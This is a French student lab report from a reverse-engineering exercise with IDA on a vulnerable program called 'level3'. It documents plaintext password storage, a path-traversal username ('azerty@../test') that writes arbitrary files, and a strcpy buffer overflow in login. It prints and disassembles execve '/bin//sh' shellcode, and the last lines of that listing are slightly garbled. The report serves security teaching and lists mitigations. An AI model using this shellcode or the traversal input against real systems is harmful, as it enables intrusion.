NOGUES
Maël

Compte Rendu TP IDA
===================

Remarques Générales
-------------------------------------
L'objectif de ce TP est d'identifier des erreurs dans l'élaboration du programme level3 et leurs conséquences.
On considérera dans un premier temps que le programme s'éxécute en local, puis éventuellement qu'il s'exécute sur une machine distante.
Expliquez clairement les failles identifiées: expliquez votre démarche pour les trouver, l'endroit ou elles se trouvent, et leurs conséquences respectives.

Le format est libre, si vous voulez vous pouvez suivre le plan d'action proposé et y ajouter vos commentaires. N'oubliez pas de justifier vos réponses.

1. Executer level3 et identifier les différentes fonctionnalitées.

On voit que le programme offre 3 choix au lancement :
+ Créer un nouvel utilisateur.
+ Se connecter à un compte utilisateur.
+ Quitter.

L'option pour créer un utilisateur ne fonctionne pas et renvoie une erreur :
| WARNING:Unable to open account database. Please check your installation. |
|--------------------------------------------------------------------------|
| Exiting with error code -6913. |

2. Retrouver les addresses dans le main des différents choix du menu principal, et renommer les fonctions correspondantes.

+ sub_4242464C : create_user
+ sub_424248A3 : connect_user
+ loc_42424A70 : quit

3. La création de nouveaux comptes ne fonctionne pas. Rechercher le code d'erreur en tant que valeur immédiate avec IDA pour identifier le problème.

La recherche de la valeur -6913 qui est le code erreur affiché par le message d'erreur nous renvoie un résultat :
| Address | Function | Instruction |
|----------------|--------------|-----------------------------|
| .text:42424632 | sub_4242451D | mov [ebp+var_C], 0FFFFE4FFh |

Le problème est l'absence d'un répertoire correspondant à la base des utilisateurs. Ce répertoire doit se nommer 'account_db'.

4. Modifier votre système pour permettre la création de nouveaux compte.

Pour permettre la création de nouveaux compte, nous créons le répertoire 'account_db' comme cité à la question précédente.

5. Créer un nouvel utilisateur et faites une hypothèse sur le format de la base de comptes.

Nous testons le bon fonctionnement de la fonction de création de compte :
| n |
|-----------------------------------------|
| Please enter email address as username: |
| azerty@uiop.qsd |
| Please choose password: |
| uiop |
| Please confirm password: |
| uiop |
| Account created. |

En regardant les fichiers créés par cet ajout d'utilisateur, on découvre un fichier 'uiop.qsd' dans le dossier base de données.
Ce fichier contient le nom d'utilisateur sur le domaine 'uiop.qsd' ainsi que le mot de passe en clair :
| azerty:uiop |
|-------------|

On peut donc supposer que la création d'utilisateurs crée un fichier au nom du domaine et y ajoute les utilisateurs de ce nom de domaine avec leur mot de passe en clair au format 'utilisateur:mot de passe'.

6. Confirmer votre hypothèse avec IDA.

On voit dans la fonction sub_42424499 que notre hypothèse se vérifie, en effet, l'utilisateur est ajouté au fichier ouvert dans 'stream' en ajoutant d'abord le nom d'utilisateur, puis le caractère ':' puis le mot de passe vérifié.

7. Est-ce une façon raisonable de stocker des mots de passe? Si oui, justifiez, si non, décrire la bonne façon.

Non, cette méthode n'est pas raisonable pour stocker des mots de passe car n'importe quel utilisateur peut les lire librement.

Une bonne manière de les stocker serait de stocker le hash des mots de passe et donc hasher les entrées utilisateur lors de la connection pour vérifier la validité du mot de passe entré.

8. Est-il possible de modifier un fichier arbitraire du système?

Oui on peut modifier un fichier arbitraire du système avec ce programme, un exemple de celà est :
| n |
|-----------------------------------------|
| Please enter email address as username: |
| azerty@../test |
| Please choose password: |
| uiop |
| Please confirm password: |
| uiop |
| Account created. |
| # cat test |
| azerty:uiop |

9. Il y a un buffer overflow dans la fonctionalité de connection.
+ Faire une hypothèse sur l'information qui peut déborder, vérifier en modifiant un ficher base de comptes.

On remarque en modifiant le fichier de compte créé qu'un nom d'utilisateur de plus de 32 caractères n'est pas reconnue par le système même si elle est valide dans le fichier.

On remarque aussi que la même chose s'applique au mot de passe, mais celui-ci est capable de déborder en dehors du programme car on obtient un segmentation fault lorsqu'on utilise un mot de passe de plus de 32 caractères.

+ Dessiner la pile au début de la function de connection.
+ Identifier la fonction qui provoque le débordement.

La fonction qui provoque le débordement est 'strcpy'. Elle copie une chaine de caractères à l'adresse de destination donnée.
Elle ne vérifie pas la longueur de l'entrée par rapport à celle de destination et permet donc un débordement.

10. Exploiter le buffer overflow en modifiant un fichier base de comptes avec un éditeur hexadecimal (par exemple bless) pour exécuter le code suivant:
31c050682f2f7368682f62696e89e389c189c2b00bcd8031c040cd80
Décrire la démarche et expliquer ce que fait ce code.

Pour utilser ce shell code, il faut ecrire sur la pile le shell code en utilisant 'strcpy' qui recopie le mot de passe du fichier dans la pile, puis faire pointer l'esp sur le début du shellcode.

Ce shellcode comporte 2 parties :
+ 31c050682f2f7368682f62696e

Ajoute sur la pile la chaine de caractères '/bin//sh'.

+ 89e389c189c2b00bcd8031c040cd80

Execute l'opcode 0xb (11) correspondant à la fonction execve qui exécute une commande passée en paramètre, ici le '/bin/sh' qu'on a mis sur le haut de la pile.

Le code désassemblé de ce shell code nous donne donc :

xor    %eax,%eax

push   %eax

push   $0x68732f2f

push   $0x6e69622f

mov    %esp,%ebx

mov    %eax,%ecx

mov    %eax,%edx

mov    $0xb,%al

int    $0x80

xor    %eax,

%inc    %eax

int    $0x80

11. Citer des protections permettant de rendre difficile cette exploitation. Une autre faille (via la création d'un utilisateur particulier) permet de contourner certaines.

Pour rendre plus difficile cette exploitation on peut ajouter une protections sur la pile à la compilation avec le paramètre '-fstack-protector'.

On peut aussi modifier le code source du programme en remplaçant 'strcpy' par 'strncpy'.

12. Repenser au format de stockage. Dans l'hypothèse ou le service s'exécute sur un ordinateur distant, vous n'avez pas accès aux fichiers de bases de comptes.
+ Est-il possible d'usurper l'identité d'un autre utilisateur?
+ Est-il possible de rejouer l'attaque par buffer overflow? avec le même code?

13. Avez-vous trouvé d'autres failles ou faiblesses?
